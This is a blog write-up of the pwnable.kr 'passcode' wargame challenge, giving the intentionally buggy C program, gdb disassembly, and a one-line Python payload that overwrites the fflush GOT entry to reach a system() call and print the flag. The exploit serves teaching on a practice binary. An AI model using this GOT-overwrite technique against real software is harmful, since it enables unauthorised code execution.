---
layout: post
title:  "Passcode - Write-Up [Pwnable.kr]"
date:   2016-08-5 14:30:00 +0200
categories: security wargame pwnable
---

[Pwnable.kr](http://pwnable.kr) is a non-commercial wargame site which provides various pwn challenges regarding system exploitation. 

In this blog post I'll write-up how I managed to pass the "passcode" challenge.


### Code

``` c
#include <stdio.h>
#include <stdlib.h>

void login() {
	int passcode1;
	int passcode2;

	printf("enter passcode1 : ");
	scanf("%d", passcode1);
	fflush(stdin);

	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
	printf("enter passcode2 : ");
	scanf("%d", passcode2);

	printf("checking...\n");
	if (passcode1==338150 && passcode2==13371337) {
		printf("Login OK!\n");
		system("/bin/cat flag");
	} else {
		printf("Login Failed!\n");
		exit(0);
	}
}

void welcome() {
	char name[100];
	printf("enter you name : ");
	scanf("%100s", name);
	printf("Welcome %s!\n", name);
}

int main() {
	printf("Toddler's Secure Login System 1.0 beta.\n");

	welcome();
	login();

	// something after login...
	printf("Now I can safely trust you that you have credential :)\n");
	return 0;	
}
```

### Audit

Following the flow of the program: in the `welcome` function we enter our name, and in the `login` function we enter `passcode1` and `passcode2`, if they match respectively `338150` and `13371337` we'll get the shell.

Auditing the code, we can easily see a bug in the `login` function: the program is not passing to the `scanf` functions the addresses of `passcode1`/`passcode2`, so possibly it leads to arbitrary 4 bytes write if we can control somehow the value of passcodes.

Let's see at binary level if we can control the passcodes values:

```nasm
$ gdb passcode
(gdb)
(gdb) set disassembly-flavor intel
(gdb) disas welcome
Dump of assembler code for function welcome:
... (output truncated for brevity) ...
   0x0804862f <+38>:	lea    edx,[ebp-0x70]
   0x08048632 <+41>:	mov    DWORD PTR [esp+0x4],edx
   0x08048636 <+45>:	mov    DWORD PTR [esp],eax
   0x08048639 <+48>:	call   0x80484a0 <__isoc99_scanf@plt>
... (output truncated for brevity) ...
```

Here we save our name into `$ebp-0x70`, the buffer is 100 bytes so it ends at __($ebp-0x70)+0x64__.

Ok, now we move on, and we jump to the `login` function, in order to see if we have any chance to control the passcodes values form the `name` buffer previously allocated.

```nasm
(gdb) disas login
Dump of assembler code for function login:
... (output truncated for brevity) ...
   0x080485c5 <+97>:	cmp    DWORD PTR [ebp-0x10],0x528e6
   0x080485cc <+104>:	jne    0x80485f1 <login+141>
   0x080485ce <+106>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x080485d5 <+113>:	jne    0x80485f1 <login+141>
... (output truncated for brevity) ...
```

At this point __$ebp__ is the same as in the `welcome` function, so we can compare the two values: `(($ebp-0x70)+0x64)-($ebp-0x10)` = __4__. Great, we can control `passcode1` ($ebp-0x10) from the `name` buffer.

The goal here is to see where the `system` call is placed in our binary.

```nasm
(gdb) disas login
Dump of assembler code for function login:
... (output truncated for brevity) ...
   0x080485e3 <+127>:	mov    DWORD PTR [esp],0x80487af
   0x080485ea <+134>:	call   0x8048460 <system@plt>
... (output truncated for brevity) ...
```

It's at `0x80485E3` which in decimal is __134514147__. Now we need to jump there overriding the `GOT` of `fflush` with our address.

Let's see where the `fflush`'s relocation address is:

```nasm
$ readelf -r passcode | grep fflush
0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
```

### Exploit


```python
$ python -c "print 'A'*(100-4) + '\x04\xa0\x04\x08' + '134514147'" > /tmp/passcode-poc
```

We fill the `name` buffer with padding but the latest 4 bytes (which are also the same as `passcode1`) that we fill with the `fflush` GOT address. Then we add the address of the `system` call which will be called instead of `fflush`.


```
$ cat /tmp/passcode-poc | ./passcode
Toddler's Secure Login System 1.0 beta.
enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
***********************************************
Now I can safely trust you that you have credential :)
```

### Conclusion

Make sure you pass the right arguments to functions (in this case `scanf` needs a pointer to an `int` and not the `int` value itself).
